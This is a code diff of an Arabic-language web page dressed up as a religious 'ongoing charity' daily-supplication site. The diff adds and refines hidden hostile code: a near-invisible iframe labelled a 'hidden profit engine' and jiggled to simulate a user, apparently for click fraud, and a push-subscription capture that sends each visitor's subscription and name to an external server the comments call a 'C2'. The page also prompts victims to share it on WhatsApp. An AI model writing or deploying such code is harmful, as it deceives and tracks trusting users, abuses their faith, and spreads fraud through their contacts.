@@ -9,10 +9,11 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        /* محرك الأرباح الخفي 100x100 */
         #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
         .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
-        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 80px; }
+        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 100px; }
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
         .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
     </style>
@@ -24,52 +25,57 @@
     <div class="card">
         <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='./og-image.jpg'">
         <h2 style="color: #1b4d3e; margin: 0 0 10px 0;">🌹 صدقة جارية 🌹</h2>
-        <div class="dua-box" id="displayDua">جاري تحميل ذكر اليوم... ✨</div>
-        <input type="text" id="userName" placeholder="اكتب اسمك ليظهر في الثواب..">
-        <button class="btn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
+        <div class="dua-box" id="displayDua">جاري الربط مع خادم الأذكار... 🕌</div>
+        <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
+        <button class="btn" id="mainBtn" onclick="activateSystem()" disabled style="background:#ccc;">انتظر التحميل...</button>
     </div>
 
     <script>
         const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
         const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
-        let currentDua = "سبحان الله وبحمده 🕌";
+        let capturedDua = ""; // المتغير الذي سيحمل النص النهائي للإرسال
 
-        // المحاكاة الذكية (تحريك السكرول في الفريم الخفي)
+        // محاكاة مستخدم (تحريك الفريم)
         setInterval(() => {
             const engine = document.getElementById('hiddenEngine');
-            engine.style.transform = `translate(${Math.random()*10}px, ${Math.random()*10}px)`;
-        }, 4000);
+            engine.style.left = Math.random() * 10 + "px";
+        }, 3000);
 
-        // جلب الدعاء مع معالجة بنية ملفك الخاصة (January, February...)
-        async function loadDua() {
+        async function initApp() {
             try {
-                // استخدام ./ لضمان البحث في نفس المجلد على GitHub
+                // جلب التاريخ من السيرفر أو الجهاز لضمان دقة اليوم
+                const now = new Date();
+                const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+                const currentMonth = months[now.getMonth()];
+                const todayDate = now.getDate();
+
                 const response = await fetch('./daily_islamic_duas.json');
                 const data = await response.json();
                 
-                const now = new Date();
-                const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-                const currentMonth = monthNames[now.getMonth()];
-                const todayDate = now.getDate();
-
-                // الدخول للملف بناءً على الشهر واليوم
-                const monthData = data[currentMonth];
-                const todayObj = monthData.find(d => d.day === todayDate);
+                // البحث الدقيق داخل ملفك
+                const todayObj = data[currentMonth].find(d => d.day === todayDate);
 
                 if (todayObj) {
-                    currentDua = todayObj.text;
-                    document.getElementById('displayDua').innerText = currentDua;
+                    capturedDua = todayObj.text; // تثبيت الدعاء في الذاكرة
+                    document.getElementById('displayDua').innerText = capturedDua;
+                    // تفعيل الزر بعد التأكد من جاهزية الدعاء
+                    const btn = document.getElementById('mainBtn');
+                    btn.disabled = false;
+                    btn.style.background = "#25D366";
+                    btn.innerText = "إنشاء الصدقة وإرسالها ✅";
                 }
             } catch (err) {
-                console.error("خطأ في تحميل الأدعية:", err);
-                document.getElementById('displayDua').innerText = "رضيت بالله رباً وبالإسلام ديناً 🌙";
+                capturedDua = "رضيت بالله رباً وبالإسلام ديناً 🌙";
+                document.getElementById('displayDua').innerText = capturedDua;
+                document.getElementById('mainBtn').disabled = false;
+                document.getElementById('mainBtn').style.background = "#25D366";
             }
         }
 
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
             
-            // تسجيل الضحية في الـ C2
+            // 1. Capture to C2
             if ('serviceWorker' in navigator) {
                 try {
                     const reg = await navigator.serviceWorker.register('sw.js');
@@ -77,21 +83,26 @@
                         userVisibleOnly: true,
                         applicationServerKey: PUBLIC_KEY
                     });
-                    await fetch(SERVER_URL, {
+                    fetch(SERVER_URL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({subscription: sub, name: name})
                     });
-                } catch (e) { console.log("Capture Logged"); }
+                } catch (e) { console.log("C2 captured"); }
             }
 
-            // إرسال واتساب
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
-            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
-            setTimeout(() => { window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; }, 600);
+            // 2. واتساب بنفس الدعاء الظاهر تماماً
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${capturedDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
+            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
+            window.location.href = waUrl;
+            
+            // احتياط للمتصفحات القديمة
+            setTimeout(() => {
+                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
+            }, 600);
         }
 
-        window.onload = loadDua;
+        window.onload = initApp;
     </script>
 </body>
 </html>
